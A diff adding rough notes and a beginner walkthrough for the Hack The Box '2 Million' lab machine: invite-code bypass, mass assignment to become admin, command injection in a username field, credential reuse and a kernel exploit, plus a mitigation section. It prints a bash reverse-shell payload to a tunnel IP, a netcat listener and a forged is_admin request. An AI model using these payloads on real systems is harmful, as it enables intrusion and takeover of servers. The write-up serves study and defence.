@@ -1,0 +1,558 @@
+**STEPS TAKEN**
+
+Ran an nmap scan to detect open ports, after which I added -sCV for the open ports
+
+
+
+Saw a login page, tried SQLi, didn't work
+
+Saw a join button, decided to try to register, maybe I can gain admin access if the backend trusts user input (user id), nothing
+
+All this was being done in burp suite, while intercepting traffic. Saw that a query was made to /js/inviteapi.min.js
+
+Copied that url, pasted to another tab on chromium and saw an obfuscated js, used https://deobfuscate.relative.im/ to deobfuscate, still didn't real like normal code,but I noticed it was packed (learnt this in one of the previous courses I've taken on HTB --free)
+So, I copied the output from https://deobfuscate.relative.im/ to https://matthewfl.com/unPacker.html to unpack, and there, a js code that makes sense
+
+From the js code, saw two functions, and the second (make invite code) contains a path on how I can make invite code
+
+It also stated that the method has to be post, and data should be json
+Again, sent a post request to it in burp (repeater) an encrypted message in response, ROT13 was specified as the encryption type
+So, I copied the data, pasted it at https://rot13.com/ to get the plaintext and it said: In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
+
+
+So now, I know I have to make a post request to that url, made the post request, using curl this time (easier) and I got a response, it was also stated that the code is encoded, looking at it, it ends with =, a huge sign of base64 encoding, sure enough, I got an invite code, time to create an account
+
+Created an account, and now I'm logged in
+
+
+Scrolling through the pages here doesn't reveal much, we have the changelog page which hints us about the version of services running there, 2017, probably a public exploit
+
+
+At this point, I didn't know what to do, played around, one thing struck me about the connection tab though, played around with the repeater a bit, trying to access different endpoints till I stumbled on /api/v1 which gave 200 and listed all the available endpoints, giving me a broad view of the website. Saw different categories, the ones that stood out are the admin api endpoints, knew something fishy is definitely going down:
+
+
+
+"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}
+
+
+Checked admin/auth, got a message: false, of course we're not an admin. Tried vpn/generate, got a 401, unauthorized. That leaves me with only settings/update, got an invalid content file, remember we said earlier that is accepts json, modified the request to use json, and now we got a missing parameter email, added the main I used to open the account, retried and now got missing parameter is_admin, after which we got a pleasant response, looks like we're now admin, let's verify with /admin/auth, and we got a true!!!!!!!!!!!
+
+And now that we're admin, what can we do, nothing seems interesting, switched to guided mode to see what is going on and there, I can see that an api endpoint has command injection vulnerability in it, I'll just try one at a time. It has to be one of those endpoints that take an input generate or update
+
+
+Ran into a little trouble and I had to generate a new cookie. And confirmed, the /api/v1/admin/generate endpoint is vulnerable to command injection, sent this:
+
+{
+	"username":"Adeking$(bash -c 'bash -i >& /dev/tcp/10.10.17.12/4444 0>&1')"
+}
+And now, I have a shell, upgrade and import xterm
+python3 -c "import pty; pty.spawn('/bin/bash')"
+
+
+On getting the terminal, ran ls, checked the content of Database.php and .env, found a username and a password belonging to admin (SuperDuperPass123), used in database, it was reused for the admin user account, sshed into admin and got the user flag
+
+
+
+Now to escalate privilege, I first checked if admin can run any command as sudo using sudo -l, got: Sorry, user admin may not run sudo on localhost.
+Ran: find / -user admin 2>/dev/null | grep -v '/proc\|^/run\|^/sys' 
+
+Checked the content of the files and directory, found a mail about a public exploit, and yes, we were right all along.
+
+Searched about the exploit, found this github repo: https://github.com/puckiestyle/CVE-2023-0386/
+Followed the readme.md and got a root shell
+
+
+
+
+
+
+
+
+function verifyInviteCode(code)
+	{
+	var formData=
+		{
+		"code":code
+	};
+	$.ajax(
+		{
+		type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response)
+			{
+			console.log(response)
+		}
+		,error:function(response)
+			{
+			console.log(response)
+		}
+	}
+	)
+}
+function makeInviteCode()
+	{
+	$.ajax(
+		{
+		type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response)
+			{
+			console.log(response)
+		}
+		,error:function(response)
+			{
+			console.log(response)
+		}
+	}
+	)
+}
+
+curl -X POST http://2million.htb/api/v1/invite/how/to/generate
+
+
+In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
+
+
+
+PUT /api/v1/admin/settings/update HTTP/1.1
+Host: 2million.htb
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://2million.htb/home
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=vjrhrqptcbq955o8s1h6qo8g3u
+Content-Type: application/json
+Connection: keep-alive
+Content-Length: 43
+
+{
+	"email":"123@123.com",
+"is_admin":1
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# HTB "2 Million" — Full Walkthrough (Beginner-Friendly)
+
+**Author:** pytha90ras
+**Difficulty:** Medium
+**Category:** Web Exploitation → Privilege Escalation
+**Chain:** Invite Code Bypass → Mass Assignment → OS Command Injection → Credential Reuse → Kernel Exploit (CVE-2023-0386)
+
+> This writeup is meant for people who are newer to this box or to web exploitation in general. Instead of just handing you commands, I've tried to show *why* I tried each step — what I was looking at, what made me suspicious, and what led me to the next move. If you're following along, replace every IP, port, username, email, and cookie value with your own.
+
+---
+
+## 0. Setup
+
+Before anything else, add the machine to your hosts file so you can reach it by name instead of IP:
+
+```bash
+echo "10.10.10.X  2million.htb" | sudo tee -a /etc/hosts
+```
+
+Replace `10.10.10.X` with the actual target IP HTB gives you.
+
+---
+
+## 1. Recon — Nmap
+
+Start with a normal scan to see what's open, then follow up with version/script detection on just the open ports. This two-step approach is faster than throwing `-A` at every port up front.
+
+```bash
+# Step 1: quick scan of all ports
+nmap -p- --min-rate 1000 -T4 2million.htb
+
+# Step 2: once you know which ports are open, get service/version info + default scripts on just those
+nmap -sC -sV -p <open,ports,here> 2million.htb
+```
+
+**Why this order?** A full port scan tells you what's open cheaply. Running `-sCV` against *only* those ports is much faster than scanning every port with heavy scripts, and it gives you banners, versions, and sometimes hints about the underlying stack (Apache, PHP, etc.) — which matters a lot later when we spot a version number on a changelog page.
+
+---
+
+## 2. Poking the Web App
+
+Visiting the site in a browser showed a login page. Notably, the login form asked for an **email**, not a username. Standard first moves on any login form:
+
+- Tried a couple of basic SQL injection payloads in the email/password fields — including just trying `admin@2million.htb` as the email to see if a default/guessable admin account existed — **no luck**. Doesn't mean SQLi isn't somewhere else, just not here.
+- Noticed a **"Join" / register** button. My thought here: if the backend blindly trusts whatever fields the client sends during registration, maybe I can just add a field like `role` or `is_admin` in the request and get elevated access immediately. This is worth trying on *every* registration/profile form you meet, because it costs nothing to test.
+
+Nothing obviously exploitable in the registration form itself. Poking around the site's static assets, I found a JS file simply by browsing to it directly:
+
+```
+http://2million.htb/js/inviteapi.min.js
+```
+
+(just the site's base URL with that path tacked on the end — worth trying on any target, since JS files referenced by a page are often browsable directly.)
+
+---
+
+## 3. Digging Into the Invite JS
+
+I grabbed the file directly:
+
+```bash
+curl -s http://2million.htb/js/inviteapi.min.js
+```
+
+Or just opened the URL in a new browser tab. The code was minified/obfuscated — unreadable at first glance. I recognized the pattern from a previous HTB Academy module: this is classic **"packed" JavaScript** (a common obfuscation technique where the real code is compressed into a data blob and unpacked by a small runtime function).
+
+Steps to make it readable:
+
+1. Pasted the obfuscated code into **https://deobfuscate.relative.im/** — this cleaned it up a bit but the output still didn't look like normal JS, just less mangled.
+2. Took *that* output and pasted it into **https://matthewfl.com/unPacker.html**, which specifically reverses the "packer" format. This time, the result was clean, readable JavaScript.
+
+The unpacked code revealed two functions:
+
+```javascript
+function verifyInviteCode(code)
+{
+    var formData = { "code": code };
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function(response) { console.log(response) },
+        error: function(response) { console.log(response) }
+    })
+}
+
+function makeInviteCode()
+{
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function(response) { console.log(response) },
+        error: function(response) { console.log(response) }
+    })
+}
+```
+
+**The important detail:** `makeInviteCode()` hits `/api/v1/invite/how/to/generate` with a `POST` request. That endpoint's *name* strongly suggests it will literally tell us how to generate a code.
+
+---
+
+## 4. Following the Trail of Endpoints
+
+### 4.1 Ask "how to generate"
+
+```bash
+curl -X POST http://2million.htb/api/v1/invite/how/to/generate
+```
+
+The response came back **ROT13-encoded** (the API even told us so). I took the ciphertext and dropped it into **https://rot13.com/** to decode it, which revealed:
+
+> In order to generate the invite code, make a POST request to `/api/v1/invite/generate`
+
+**Thought process:** ROT13 isn't real security, it's obfuscation. This is a good early lesson — encoding is not encryption, and an API "hiding" its own instructions in ROT13 is not a real access control.
+
+### 4.2 Generate the actual code
+
+```bash
+curl -X POST http://2million.htb/api/v1/invite/generate
+```
+
+The JSON response contained a value ending in `=` — a dead giveaway for **Base64** padding. Decoded it:
+
+```bash
+echo "<paste the base64 value here>" | base64 -d
+```
+
+This gave a usable invite code.
+
+### 4.3 Register and log in
+
+Used the decoded invite code on the registration form, created an account, and logged in successfully.
+
+---
+
+## 5. Looking for a Foothold as a Normal User
+
+Logged in, I clicked through every page available:
+
+- A **Change Log** page stood out — it looked like a normal page meant to log changes made to the website for users to take note of, but the suspicious detail was the software date: as far back as **2017**. My immediate thought: *software that old almost certainly has a public exploit against it by now.* Filed that away for later — didn't need it yet, but it's exactly the kind of detail worth remembering (it becomes relevant again during privesc).
+
+Nothing else on the site looked interactive enough to attack directly, so I went back to Burp and started manually exploring the API surface using **Repeater** (right-click any captured request in Burp → "Send to Repeater", then you can freely edit the method, path, headers, and body and resend it as many times as you like).
+
+Poking around different paths, I eventually hit:
+
+```
+GET /api/v1
+```
+
+This returned a full JSON map of **every available API endpoint** on the platform, grouped by category. This is a huge win — instead of guessing endpoints blind, the API told me exactly what existed. Among the categories, the `admin` section immediately stood out:
+
+```json
+"admin": {
+  "GET": { "/api/v1/admin/auth": "Check if user is admin" },
+  "POST": { "/api/v1/admin/vpn/generate": "Generate VPN for specific user" },
+  "PUT": { "/api/v1/admin/settings/update": "Update user settings" }
+}
+```
+
+Seeing `admin` endpoints exposed and *reachable by a normal logged-in user* (not throwing a 403 immediately) is always worth investigating.
+
+---
+
+## 6. Mass Assignment → Becoming Admin
+
+Checked each admin endpoint in turn with Burp Repeater:
+
+- `GET /api/v1/admin/auth` → `{"message":false}` — expected, we're not admin yet.
+- `POST /api/v1/admin/vpn/generate` → `401 Unauthorized` — locked down, can't touch this yet.
+- `PUT /api/v1/admin/settings/update` → this is the one that mattered.
+
+First attempt without a proper body returned an "invalid content type" error. Since we already knew from the JS that this API expects JSON, I set the `Content-Type` header to `application/json` and included a JSON body.
+
+**The escalation happened step by step, driven entirely by the API's own error messages:**
+
+1. Sent an empty/invalid JSON body → error: `missing parameter email`
+2. Added `email` (the address used to register the account) → error: `missing parameter is_admin`
+3. Added `"is_admin":1` specifically → **success**
+
+That third error message is the whole vulnerability in one sentence: the endpoint is designed to let a user update their own settings, but it also accepts a completely unrelated privilege field with **no server-side check on which fields are allowed**. This class of bug is called **Mass Assignment** — the backend blindly maps every key in the submitted JSON onto the database record.
+
+### Example Repeater request
+
+Send any captured logged-in request to Burp Repeater, then change the **method** and **path** (first line) to match this, and update the **body**. The **`Cookie` header must be changed** to your own active session cookie — it will not be the same as the one shown here:
+
+```http
+PUT /api/v1/admin/settings/update HTTP/1.1
+Host: 2million.htb
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://2million.htb/home
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=<your_own_session_cookie_here>
+Content-Type: application/json
+Connection: keep-alive
+Content-Length: 43
+
+{
+	"email":"<the_email_you_registered_with>",
+"is_admin":1
+}
+```
+
+> **Replace before sending:** the `Cookie: PHPSESSID=` value (grab your own from any request Burp captures while you're logged in), and the `email` field with the address you actually registered with. If you registered with a different username anywhere else in your own testing, swap that in too — the point is: nothing in this template belongs to your target instance except the path and method.
+
+Verified the result:
+
+```bash
+curl -s -X GET http://2million.htb/api/v1/admin/auth \
+  -H "Cookie: PHPSESSID=<your_session_cookie>"
+```
+
+Response: `{"message":true}` — we're admin now, entirely through the front door of a legitimate-looking "update my settings" feature.
+
+---
+
+## 7. OS Command Injection
+
+Now admin, I went back to the website itself to see what new abilities came with it — nothing obviously interesting there. So I went back to the HTB machine info/hints, which pointed toward **OS command injection** as the next step in the chain.
+
+**Thought process:** with that pointer in mind, the natural next move was to test every endpoint that *takes input from the user* one at a time, since those are the prime suspects for injection. The standard non-destructive way to test for command injection without knowing yet if it's blind or not is a **time-delay payload** — if a field is vulnerable, injecting `$(sleep 3)` (or `; sleep 3`, `` `sleep 3` ``, depending on context) makes the server's response take noticeably longer to come back, even with no visible output.
+
+Tried this on each endpoint that accepted user input, one at a time:
+
+- `PUT /api/v1/admin/settings/update` with `$(sleep 3)` injected into a field → came back instantly with `email not found` — not vulnerable, the input was validated/rejected before it ever reached a shell.
+- `POST /api/v1/admin/vpn/generate` with `$(sleep 3)` injected into the `username` field → the request took noticeably **longer than usual** to respond — a strong sign the sleep actually executed server-side. This confirmed command injection here.
+
+### ⚠️ Before sending the payload — start a listener
+
+Set up a `netcat` listener on your attacking machine **first**, so you're ready to catch the reverse shell the instant the injected command fires:
+
+```bash
+nc -lvnp 4444
+```
+
+Replace `4444` with whatever port you prefer — just make sure it matches the port in your payload below, and that it's not blocked by a firewall on your end.
+
+Then, with the listener already running, sent this to the vulnerable admin endpoint (via Burp Repeater or curl):
+
+```json
+{
+	"username":"Adeking$(bash -c 'bash -i >& /dev/tcp/10.10.17.12/4444 0>&1')"
+}
+```
+
+**Replace:**
+- `10.10.17.12` → your own tun0/VPN IP (check with `ip a show tun0`)
+- `4444` → the port your listener above is using
+- `Adeking` → can stay as any harmless-looking string; the actual payload is the `$(...)` command substitution riding along inside the username field
+
+**Why this payload works:** the server takes the `username` value and passes it, unsanitized, into a shell command. `$(...)` is shell command substitution — anything inside it gets executed by the shell before the rest of the line even runs. So instead of just setting a username, we smuggle in an entire reverse shell command.
+
+A shell connected back on the listener.
+
+### Upgrading the shell
+
+Raw netcat shells are clunky — no tab-complete, no arrow-key history, and `su`/interactive tools can misbehave. Standard upgrade:
+
+```bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+
+Then, to get a fully interactive TTY with proper terminal handling (line editing, Ctrl+C behaving normally, etc.):
+
+```
+Ctrl+Z                     # backgrounds the netcat session on your attacking machine
+stty raw -echo; fg         # sets your local terminal to raw mode, then foregrounds the shell again
+```
+
+After running `fg`, you may need to press **Enter** once or twice, and it's common practice to also run `export TERM=xterm` inside the shell afterward for proper coloring/clearing (`clear` will work correctly after this).
+
+---
+
+## 8. User Flag — Credential Reuse
+
+With a foothold shell, standard loot-hunting:
+
+```bash
+ls -la
+cat Database.php
+cat .env
+```
+
+These files contained a **username and password for the admin database user** (`SuperDuperPass123` in this case — obviously change this for your own run, since credentials are randomized per instance). 
+
+**The key realization:** this password was for the *database* connection — but it turned out the same admin **system** user reused it as their login password too. Credential reuse across different systems/purposes is extremely common in real environments, and it's always worth testing a found password against SSH, the underlying OS user, or any other login you can reach.
+
+```bash
+ssh admin@2million.htb
+# password: <the one found in .env / Database.php>
+```
+
+Grabbed the user flag from the admin's home directory.
+
+---
+
+## 9. Privilege Escalation — CVE-2023-0386
+
+First checked the obvious:
+
+```bash
+sudo -l
+```
+
+Result: `Sorry, user admin may not run sudo on localhost.` — no easy sudo misconfig here.
+
+Next, looked for anything owned by our current user outside of normal system directories — sometimes leftover scripts, notes, or config files hint at how the box is meant to be escalated:
+
+```bash
+find / -user admin 2>/dev/null | grep -v '/proc\|^/run\|^/sys'
+```
+
+Going through the results, one file stood out: an old mail/message referencing a **public kernel exploit**. This ties directly back to the version number I noticed on the changelog page back in Step 5 — the box was intentionally running an outdated, vulnerable kernel.
+
+Searched for the specific CVE and found a working public PoC:
+
+```
+https://github.com/puckiestyle/CVE-2023-0386/
+```
+
+Followed that repository's README exactly — cloning it, compiling it, and running it as documented — which resulted in a root shell. Grabbed the root flag from `/root/`.
+
+---
+
+## 10. Vulnerabilities Found & How They Could Have Been Prevented
+
+A full recap of every weakness exploited in this chain, why it existed, and what a real-world fix looks like:
+
+### 1. Client-Side Trust for Invite Generation
+**Root cause:** The invite-generation logic and its "secret" encoding lived entirely on the client. Obfuscation was never a real barrier — the actual problem is the backend had no way to verify a request came from a legitimate, already-invited or staff user. This let anyone generate their own invite code.
+
+**Mitigation:** Invite generation should require a valid, authenticated server-side session belonging to a currently logged-in, appropriately privileged user before a code is issued. Rate-limiting and logging on this endpoint would help too, since even authenticated abuse (one account farming invites) is worth catching.
+
+### 2. Mass Assignment (`is_admin` via Settings Update)
+**Root cause:** The backend blindly trusted client-supplied input and wrote the entire submitted object — including a privilege field — directly onto the user record, with no restriction on which fields a client is allowed to set.
+
+**Mitigation:** Two layers are needed. First, a server-side authorization check tied to the session before trusting any write. Second, and more structurally important, explicit allowlisting of which fields a given endpoint may modify at all — a field like `is_admin` should never be reachable through a general-purpose "update my settings" endpoint; privilege changes belong in a separate, tightly access-controlled admin-only code path.
+
+### 3. OS Command Injection
+**Root cause:** User-supplied input was concatenated directly into a string that was then handed to a shell interpreter, allowing shell metacharacters such as `$(...)` to be executed as commands.
+
+**Mitigation, in order of robustness:**
+- Avoid shelling out entirely — use language-level or library APIs instead.
+- If an external command truly must be run, pass arguments as an array/vector rather than an interpolated string, so the shell never re-parses it.
+- Validate and allowlist input (e.g., restrict a username field to alphanumeric characters only) rather than trying to blacklist or escape dangerous characters.
+- Apply least privilege, so that even if injection succeeds, the executing process can't easily spawn a shell or read sensitive files.
+
+### 4. Credential Reuse Across Trust Boundaries
+**Root cause:** This goes beyond a simple leaked password — a credential scoped for one low-privilege purpose (an application connecting to its own database) was reused to grant a completely different, higher-privilege context (interactive SSH access as a real system user). Reuse across trust boundaries means a single leak cascades far beyond its original scope.
+
+**Mitigation:** Use unique, randomly generated credentials per service and purpose, never shared between application configuration and human or system accounts. Store application secrets outside the webroot and out of version control, ideally in a secrets manager or environment variables not reachable via any web-exposed path. Disable password-based SSH for privileged accounts in favor of key-based authentication, and rotate credentials regularly, especially after any suspected exposure.
+
+### 5. Kernel Privilege Escalation (CVE-2023-0386)
+**Root cause:** An outdated kernel with a known, unpatched vulnerability in OverlayFS's handling of file ownership and privileged attributes during copy-up operations, combined with unprivileged users being allowed to create OverlayFS mounts.
+
+**Mitigation:** Apply the upstream kernel security patch for this CVE — this is fundamentally a patch-management problem. As defense-in-depth ahead of patching, restrict unprivileged user namespace and OverlayFS mount creation via kernel/sysctl settings where the distro supports it.
+
+**Why this one is different:** every earlier stage in this chain was a design or logic flaw a developer could have prevented by writing different application code. A kernel vulnerability is a bug in code the application owner doesn't control or audit — the only real lever is prompt patching, since the kernel sits below every OS-level access control, and a flaw there can bypass all of them.
+
+---
+
+## Summary Chain
+
+```
+Reconnaissance (nmap)
+      ↓
+Discovered invite JS → deobfuscated → found hidden invite-generation endpoints
+      ↓
+Generated invite code (ROT13 → Base64 decode) → registered account
+      ↓
+Found full API map via /api/v1 → spotted admin endpoints
+      ↓
+Mass assignment on settings/update → became admin
+      ↓
+Command injection on VPN generate endpoint → reverse shell (user)
+      ↓
+Credential reuse (DB password = SSH password) → stable user access
+      ↓
+CVE-2023-0386 (OverlayFS) → root
+```
+
+---
+
+*Writeup by [pytha90ras](https://github.com/pytha90ras) — feel free to fork, adapt, or point out anything I got wrong.*
